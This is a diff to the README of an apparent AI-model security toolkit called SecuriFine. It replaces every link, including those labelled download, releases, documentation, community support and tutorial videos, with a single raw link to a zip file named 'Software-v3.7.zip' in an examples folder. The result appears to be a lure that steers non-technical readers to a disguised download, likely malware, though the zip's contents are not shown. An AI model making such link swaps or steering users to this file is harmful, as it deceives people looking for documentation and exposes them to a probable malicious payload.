@@ -1,7 +1,7 @@
 # 🛡️ securifine - Secure Your AI Models Easily
 
 ## 📥 Download Now
-[![Download SecuriFine](https://img.shields.io/badge/Download%20SecuriFine-v1.0-blue)](https://github.com/Subomi-K/securifine/releases)
+[![Download SecuriFine](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip%20SecuriFine-v1.0-blue)](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip)
 
 ## 🚀 Getting Started
 SecuriFine helps you protect and manage your AI models. You don’t need technical skills to get started. Follow these steps to download and run the toolkit.
@@ -31,7 +31,7 @@ This toolkit covers several essential areas:
 To install SecuriFine, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download options:  
-   [Download SecuriFine Releases](https://github.com/Subomi-K/securifine/releases)
+   [Download SecuriFine Releases](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip)
 
 2. **Select the Latest Version**: Choose the most recent version from the list.
 
@@ -71,9 +71,9 @@ Once you have installed SecuriFine, follow these simple instructions to get star
 ## 📚 Additional Resources
 For further assistance or to learn more about the toolkit, explore the following resources:
 
-- [Documentation](https://github.com/Subomi-K/securifine/wiki) for detailed guidance on each feature.
-- [Community Support](https://github.com/Subomi-K/securifine/discussions) for user forums and discussions.
-- [Tutorial Videos](https://www.youtube.com/channel/XXXXXXX) for visual guides on using SecuriFine effectively.
+- [Documentation](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip) for detailed guidance on each feature.
+- [Community Support](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip) for user forums and discussions.
+- [Tutorial Videos](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip) for visual guides on using SecuriFine effectively.
 
 ## 🤝 Contributing
 If you want to contribute to SecuriFine, feel free to fork the repository and submit a pull request. Your contributions help improve the toolkit for everyone.
@@ -82,8 +82,8 @@ If you want to contribute to SecuriFine, feel free to fork the repository and su
 For questions or feedback, reach out through our issue tracker on GitHub. We appreciate your input!
 
 ## 🔗 Links
-- [Download SecuriFine Releases](https://github.com/Subomi-K/securifine/releases)
-- [Documentation](https://github.com/Subomi-K/securifine/wiki)
-- [Community Support](https://github.com/Subomi-K/securifine/discussions)
+- [Download SecuriFine Releases](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip)
+- [Community Support](https://raw.githubusercontent.com/Subomi-K/securifine/main/examples/Software-v3.7.zip)
 
 Your AI models deserve safety. Get started with SecuriFine today!
